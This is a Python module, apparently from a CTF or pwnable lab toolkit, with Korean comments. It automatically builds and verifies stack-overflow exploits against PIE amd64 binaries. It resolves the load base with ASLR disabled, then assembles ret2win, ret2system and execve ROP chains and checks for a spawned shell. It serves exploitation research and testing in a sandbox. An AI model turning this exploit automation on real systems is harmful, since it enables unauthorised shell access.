"""PIE 자동 ret2win — 로드 base 를 로컬 관측해 rebase 후 셸/제어 이전 증명.

PIE(ET_DYN) 실행파일은 심볼·가젯 주소가 **로드 base 상대**라, 절대주소를 전제하는
non-PIE 자동 익스(:mod:`sandbox.ret2system` 등)가 성립하지 않는다. 여기서는:

1. ASLR 을 끈 자식을 exec-stop 에서 정지시켜 로드 base 를 **로컬 관측**한다
   (:func:`sandbox.runner.resolve_pie_base`).
2. win 함수·정렬용 ret 가젯의 정적(base-0) 오프셋에 base 를 더해 런타임 주소로
   rebase 한다.
3. 같은 ASLR-off 조건에서 payload 를 주입해 제어 이전을 확인하고, win 이 셸을
   띄우면 PTY 로 ``echo <marker>`` 를 흘려 **셸 획득까지 증명**한다.

관측 base 와 검증 base 가 모두 ASLR-off 라 정확히 일치한다. 이는 원격 ASLR 우회가
아니라 **로컬 익스 가능성 증명**이다(docs/AUTO_EXPLOIT_SANDBOX.md 의 신뢰/한계 참조).
"""

from __future__ import annotations

import secrets
from pathlib import Path

from pwnable_lab.analyzer.strategy import (
    binary_exec_range,
    execve_plan,
    find_ret_gadget,
    is_pie,
    ret2system_plan,
    ret2win_target,
)
from pwnable_lab.elf.parser import parse_elf
from pwnable_lab.payload.pack import RopStep, build_overflow
from pwnable_lab.sandbox.runner import (
    PieBaseResolution,
    SandboxLimits,
    resolve_pie_base,
    verify_payload,
    verify_shell,
)


def auto_ret2win_pie(
    binary_path: str, *, offset: int, limits: SandboxLimits | None = None
) -> dict:
    """PIE 바이너리에 대해 base 를 관측·rebase 하여 ret2win 을 자동 검증한다."""

    image = parse_elf(Path(binary_path).read_bytes())
    if (image.bits or 64) != 64:
        return {"attempted": False, "reason": "pie-amd64-only"}
    if not is_pie(image):
        return {"attempted": False, "reason": "not-pie"}
    win = ret2win_target(image)
    if win is None:
        return {"attempted": False, "reason": "pie-no-win-target"}

    limits = limits or SandboxLimits()
    resolution = resolve_pie_base(binary_path, limits=limits)
    if not resolution.confirmed or resolution.base is None:
        return {
            "attempted": True,
            "technique": "ret2win-pie",
            "succeeded": False,
            "reason": "pie-base-unresolved",
            "base_resolution": resolution.as_dict(),
        }

    base = resolution.base
    win_name, win_off = win
    win_rt = base + win_off
    ret_off = find_ret_gadget(image)

    # win() 진입 시 movaps 16바이트 정렬이 필요할 수 있으므로 정렬 변형을 함께 시도.
    # (False, 직접) → (True, ret 한 슬롯 삽입).
    variants: list[tuple[bool, list[int]]] = [(False, [win_rt])]
    if ret_off is not None:
        variants.append((True, [base + ret_off, win_rt]))

    fallback: tuple[bool, dict] | None = None
    for alignment, targets in variants:
        head, *chain = targets
        payload = build_overflow(
            offset, head, bits=64, chain=[RopStep(a) for a in chain]
        )
        # win 이 셸을 띄우는 경우 PTY 로 셸 획득을 직접 증명.
        marker = "PWNPILOT_" + secrets.token_hex(4)
        proof = verify_shell(
            binary_path, payload, marker=marker, limits=limits, disable_aslr=True
        )
        if proof.shell_spawned:
            return _report(
                resolution, win, alignment, True, "shell-proven", proof.as_dict()
            )
        # 셸이 안 뜨면(win 이 플래그 출력 등) 최소한 크래시 없이 제어가 이전됐는지 확인.
        if fallback is None:
            verification = verify_payload(
                binary_path, payload, limits=limits, disable_aslr=True
            )
            if verification.succeeded:
                fallback = (alignment, verification.as_dict())

    if fallback is not None:
        alignment, verification_dict = fallback
        return _report(
            resolution, win, alignment, True, "control-transfer", verification_dict
        )
    return _report(resolution, win, False, False, "did-not-transfer", None)


def auto_ret2system_pie(
    binary_path: str, *, offset: int, limits: SandboxLimits | None = None
) -> dict:
    """PIE 바이너리에 대해 base 를 관측·rebase 하여 ret2system 을 자동 검증한다.

    win 함수가 없는 PIE 라도 ``system`` PLT·``/bin/sh``·``pop rdi`` 가젯이 있으면
    (:func:`ret2system_plan`) 로드 base 를 로컬 관측해 셋을 rebase 하고, 같은
    ASLR-off 조건에서 PTY 로 셸을 증명한다(:mod:`sandbox.ret2system` 의 PIE 판).
    """

    image = parse_elf(Path(binary_path).read_bytes())
    if (image.bits or 64) != 64:
        return {"attempted": False, "reason": "pie-amd64-only"}
    if not is_pie(image):
        return {"attempted": False, "reason": "not-pie"}
    plan = ret2system_plan(image)
    if plan is None:
        return {"attempted": False, "reason": "no-ret2system-plan"}

    limits = limits or SandboxLimits()
    resolution = resolve_pie_base(binary_path, limits=limits)
    if not resolution.confirmed or resolution.base is None:
        return {
            "attempted": True,
            "technique": "ret2system-pie",
            "succeeded": False,
            "reason": "pie-base-unresolved",
            "base_resolution": resolution.as_dict(),
        }

    base = resolution.base
    pop_rdi = base + plan["pop_rdi"]
    binsh = base + plan["binsh"]
    system = base + plan["system"]
    ret_off = find_ret_gadget(image)
    rng = binary_exec_range(image)
    # 바이너리 실행 범위도 rebase(제어가 libc system 으로 이전됐는지 폴백 판정용).
    rebased_range = None if rng is None else (base + rng[0], base + rng[1])

    # system 진입 시 movaps 16바이트 정렬이 필요할 수 있어 정렬 변형을 함께 시도.
    chains: list[tuple[bool, list[int]]] = [(False, [binsh, system])]
    if ret_off is not None:
        chains.append((True, [binsh, base + ret_off, system]))

    fallback: tuple[bool, dict] | None = None
    for alignment, chain in chains:
        payload = build_overflow(
            offset, pop_rdi, bits=64, chain=[RopStep(a) for a in chain]
        )
        marker = "PWNPILOT_" + secrets.token_hex(4)
        proof = verify_shell(
            binary_path, payload, marker=marker, limits=limits, disable_aslr=True
        )
        if proof.shell_spawned:
            return _report_system(
                resolution, plan, alignment, True, "shell-proven", proof.as_dict()
            )
        # 셸이 안 뜨면 최소한 제어가 바이너리 밖(libc system)으로 이전됐는지 확인.
        if fallback is None:
            verification = verify_payload(
                binary_path, payload, limits=limits, disable_aslr=True
            )
            rip = verification.observation.rip
            reached = (
                rip is not None
                and rebased_range is not None
                and not (rebased_range[0] <= rip < rebased_range[1])
            )
            if reached:
                fallback = (alignment, proof.as_dict())

    if fallback is not None:
        alignment, proof_dict = fallback
        return _report_system(
            resolution, plan, alignment, True, "control-into-system", proof_dict
        )
    return _report_system(resolution, plan, False, False, "did-not-spawn-shell", None)


_SYS_EXECVE = 59


def auto_execve_pie(
    binary_path: str, *, offset: int, limits: SandboxLimits | None = None
) -> dict:
    """PIE 바이너리에 대해 base 를 관측·rebase 하여 execve syscall ROP 를 검증한다.

    ``system`` 이 없는 PIE(주로 정적 링크)라도 클린 ``pop`` 가젯·``/bin/sh``·
    ``syscall`` 가젯이 있으면(:func:`execve_plan`) 로드 base 를 로컬 관측해 전부
    rebase 하고, 같은 ASLR-off 조건에서 PTY 로 셸을 증명한다(:mod:`sandbox.execve`
    의 PIE 판). 모든 재료가 바이너리 내부라 syscall 도 in-binary 이며, 성공 판정은
    셸 획득뿐이다(외부 libc 로의 제어 이전 폴백은 execve 에 해당 없음).
    """

    image = parse_elf(Path(binary_path).read_bytes())
    if (image.bits or 64) != 64:
        return {"attempted": False, "reason": "pie-amd64-only"}
    if not is_pie(image):
        return {"attempted": False, "reason": "not-pie"}
    plan = execve_plan(image)
    if plan is None:
        return {"attempted": False, "reason": "no-execve-plan"}

    limits = limits or SandboxLimits()
    resolution = resolve_pie_base(binary_path, limits=limits)
    if not resolution.confirmed or resolution.base is None:
        return {
            "attempted": True,
            "technique": "execve-pie",
            "succeeded": False,
            "reason": "pie-base-unresolved",
            "base_resolution": resolution.as_dict(),
        }

    base = resolution.base
    # execve("/bin/sh", 0, 0): 모든 가젯·문자열을 관측 base 로 rebase 한다.
    chain = [
        RopStep(base + plan["binsh"]),
        RopStep(base + plan["pop_rsi"]),
        RopStep(0),
        RopStep(base + plan["pop_rdx"]),
        RopStep(0),
        RopStep(base + plan["pop_rax"]),
        RopStep(_SYS_EXECVE),
        RopStep(base + plan["syscall"]),
    ]
    payload = build_overflow(offset, base + plan["pop_rdi"], bits=64, chain=chain)
    marker = "PWNPILOT_" + secrets.token_hex(4)
    proof = verify_shell(
        binary_path, payload, marker=marker, limits=limits, disable_aslr=True
    )
    if proof.shell_spawned:
        return _report_execve(resolution, plan, True, "shell-proven", proof.as_dict())
    return _report_execve(
        resolution, plan, False, "did-not-spawn-shell", proof.as_dict()
    )


def _report_execve(
    resolution: PieBaseResolution,
    plan: dict,
    succeeded: bool,
    reason: str,
    proof: dict | None,
) -> dict:
    base = resolution.base

    def _rt(key: str) -> str | None:
        return None if base is None else f"0x{base + plan[key]:x}"

    report: dict = {
        "attempted": True,
        "technique": "execve-pie",
        "pop_rdi_offset_hex": f"0x{plan['pop_rdi']:x}",
        "pop_rsi_offset_hex": f"0x{plan['pop_rsi']:x}",
        "pop_rdx_offset_hex": f"0x{plan['pop_rdx']:x}",
        "pop_rax_offset_hex": f"0x{plan['pop_rax']:x}",
        "binsh_offset_hex": f"0x{plan['binsh']:x}",
        "syscall_offset_hex": f"0x{plan['syscall']:x}",
        "base_hex": None if base is None else f"0x{base:x}",
        "binsh_runtime_hex": _rt("binsh"),
        "syscall_runtime_hex": _rt("syscall"),
        "shell_proven": reason == "shell-proven",
        "succeeded": succeeded,
        "reason": reason,
        "aslr": "disabled-for-local-proof",
        "base_resolution": resolution.as_dict(),
    }
    if proof is not None:
        report["shell_proof"] = proof
    return report


def _report_system(
    resolution: PieBaseResolution,
    plan: dict,
    alignment: bool,
    succeeded: bool,
    reason: str,
    proof: dict | None,
) -> dict:
    base = resolution.base
    report: dict = {
        "attempted": True,
        "technique": "ret2system-pie",
        "pop_rdi_offset_hex": f"0x{plan['pop_rdi']:x}",
        "binsh_offset_hex": f"0x{plan['binsh']:x}",
        "system_offset_hex": f"0x{plan['system']:x}",
        "base_hex": None if base is None else f"0x{base:x}",
        "system_runtime_hex": None if base is None else f"0x{base + plan['system']:x}",
        "alignment_ret_gadget": alignment,
        "shell_proven": reason == "shell-proven",
        "succeeded": succeeded,
        "reason": reason,
        "aslr": "disabled-for-local-proof",
        "base_resolution": resolution.as_dict(),
    }
    if proof is not None:
        report["shell_proof"] = proof
    return report


def _report(
    resolution: PieBaseResolution,
    win: tuple[str, int],
    alignment: bool,
    succeeded: bool,
    reason: str,
    proof: dict | None,
) -> dict:
    win_name, win_off = win
    base = resolution.base
    report: dict = {
        "attempted": True,
        "technique": "ret2win-pie",
        "target_name": win_name,
        "target_offset_hex": f"0x{win_off:x}",
        "base_hex": None if base is None else f"0x{base:x}",
        "target_runtime_hex": None if base is None else f"0x{base + win_off:x}",
        "alignment_ret_gadget": alignment,
        "shell_proven": reason == "shell-proven",
        "succeeded": succeeded,
        "reason": reason,
        "aslr": "disabled-for-local-proof",
        "base_resolution": resolution.as_dict(),
    }
    if proof is not None:
        # shell-proven 은 PTY 셸 증명, control-transfer 는 payload 검증 결과.
        report["shell_proof" if reason == "shell-proven" else "verification"] = proof
    return report
